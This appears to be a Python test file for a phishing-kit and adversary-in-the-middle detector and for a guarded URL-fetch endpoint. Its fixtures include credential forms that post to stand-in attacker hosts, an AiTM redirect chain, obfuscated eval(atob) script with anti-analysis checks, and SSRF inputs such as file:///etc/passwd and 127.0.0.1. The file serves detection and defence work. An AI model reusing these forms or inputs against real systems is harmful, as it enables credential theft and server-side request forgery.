"""Kit/AiTM fingerprint rules and the guarded on-demand endpoint."""

from __future__ import annotations

import socket

import httpx
import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.api.kit import router as kit_router
from app.dependencies import get_artifact_store, get_current_user, get_db, get_safe_fetcher
from app.engines.kit import KitContext, KitFingerprintAnalyzer, UrlSignal
from app.models import Base
from app.models.artifact import Artifact
from app.models.user import User
from app.security.safe_fetch import SafeFetcher
from app.security.url_safety import UrlSafetyValidator
from app.services.artifact_service import ArtifactStore
from tests.conftest import TEST_USER_ID


def codes(result) -> set[str]:
    return {finding.code for finding in result.findings}


class TestKitRules:
    def test_external_credential_form(self):
        html = (
            '<form action="https://collect.evil.test/steal" method="post">'
            '<input name="user"><input type="password" name="pass"></form>'
        )
        result = KitFingerprintAnalyzer().analyze(
            KitContext(body_html=html, sender_domain="corp.test")
        )
        assert "KIT_EXTERNAL_CREDENTIAL_FORM" in codes(result)

    def test_insecure_credential_form(self):
        html = (
            '<form action="http://corp.test/login">'
            '<input type="password" name="pass"></form>'
        )
        result = KitFingerprintAnalyzer().analyze(
            KitContext(body_html=html, sender_domain="corp.test")
        )
        assert "KIT_INSECURE_CREDENTIAL_FORM" in codes(result)

    def test_otp_capture_form(self):
        html = (
            '<form action="https://corp.test/login">'
            '<input type="password" name="pass">'
            '<input name="otp" placeholder="verification code"></form>'
        )
        result = KitFingerprintAnalyzer().analyze(
            KitContext(body_html=html, sender_domain="corp.test")
        )
        assert "KIT_OTP_CAPTURE_FORM" in codes(result)

    def test_aitm_proxy_chain(self):
        signal = UrlSignal(
            original_url="https://mail.corp.test/login",
            final_url="https://login.evil.test/session",
            redirect_chain=(
                "https://mail.corp.test/login",
                "https://login.evil.test/session",
            ),
            dom_has_login_form=True,
        )
        result = KitFingerprintAnalyzer().analyze(
            KitContext(body_text="Please sign in", urls=(signal,))
        )
        assert "KIT_AITM_PROXY_CHAIN" in codes(result)

    def test_known_kit_marker(self):
        result = KitFingerprintAnalyzer().analyze(
            KitContext(body_html="<script>/* Evilginx configuration */</script>")
        )
        assert "KIT_KNOWN_PHISHING_KIT" in codes(result)

    def test_obfuscated_and_anti_analysis(self):
        html = (
            "<script>eval(atob('ZWNobyBoaQ=='));"
            "if (navigator.webdriver) { debugger; }</script>"
        )
        result = KitFingerprintAnalyzer().analyze(KitContext(body_html=html))
        assert "KIT_OBFUSCATED_JAVASCRIPT" in codes(result)
        assert "KIT_ANTI_ANALYSIS" in codes(result)

    def test_benign_html_has_no_findings(self):
        html = "<p>Meeting moved to 3pm. See the calendar invite.</p>"
        result = KitFingerprintAnalyzer().analyze(
            KitContext(body_html=html, sender_domain="corp.test")
        )
        assert result.findings == []


def _answer(ip: str, port: int = 443):
    return (socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port))


def _fetcher(handler) -> SafeFetcher:
    return SafeFetcher(
        validator=UrlSafetyValidator(
            resolver=lambda *_a, **_k: [_answer("93.184.216.34")]
        ),
        client_factory=lambda: httpx.Client(
            transport=httpx.MockTransport(handler), follow_redirects=False
        ),
        max_bytes=1_000_000,
    )


@pytest.fixture()
def kit_env(tmp_path):
    engine = create_engine(
        f"sqlite:///{tmp_path}/kit.db",
        connect_args={"check_same_thread": False},
    )
    Base.metadata.create_all(engine)
    db = sessionmaker(bind=engine)()
    db.add(User(id=TEST_USER_ID, google_sub="kit-test", email="kit@test"))
    db.commit()
    store = ArtifactStore(tmp_path / "artifacts", max_bytes=2_000_000)
    app = FastAPI()
    app.include_router(kit_router)
    app.dependency_overrides[get_db] = lambda: db
    app.dependency_overrides[get_current_user] = lambda: db.get(User, TEST_USER_ID)
    app.dependency_overrides[get_artifact_store] = lambda: store
    yield app, db, store
    db.close()
    engine.dispose()


class TestKitEndpoint:
    def test_fetches_stores_and_fingerprints(self, kit_env):
        app, db, store = kit_env
        html = (
            b'<html><body><form action="https://collect.evil.test/x">'
            b'<input type="password" name="p"></form></body></html>'
        )

        def handler(request):
            return httpx.Response(
                200,
                content=html,
                headers={"content-type": "text/html"},
                request=request,
            )

        app.dependency_overrides[get_safe_fetcher] = lambda: _fetcher(handler)
        client = TestClient(app)
        response = client.post(
            "/intel/kit/fingerprint",
            json={"url": "https://public.test/login"},
        )
        assert response.status_code == 200, response.text
        body = response.json()
        assert "KIT_EXTERNAL_CREDENTIAL_FORM" in {
            finding["code"] for finding in body["findings"]
        }
        assert body["artifact_id"]
        row = db.get(Artifact, body["artifact_id"])
        assert row is not None
        assert row.kind == "url_capture"
        assert row.user_id == TEST_USER_ID
        assert store.read_bytes(row, user_id=TEST_USER_ID) == html

    def test_private_destination_is_rejected(self, kit_env):
        app, _db, _store = kit_env
        app.dependency_overrides[get_safe_fetcher] = lambda: _fetcher(
            lambda request: httpx.Response(200, content=b"no", request=request)
        )
        client = TestClient(app)
        response = client.post(
            "/intel/kit/fingerprint",
            json={"url": "http://127.0.0.1/admin"},
        )
        assert response.status_code == 400
        assert "non_public_ip" in response.json()["detail"]

    def test_non_http_scheme_is_rejected(self, kit_env):
        app, _db, _store = kit_env
        client = TestClient(app)
        response = client.post(
            "/intel/kit/fingerprint",
            json={"url": "file:///etc/passwd"},
        )
        assert response.status_code == 400
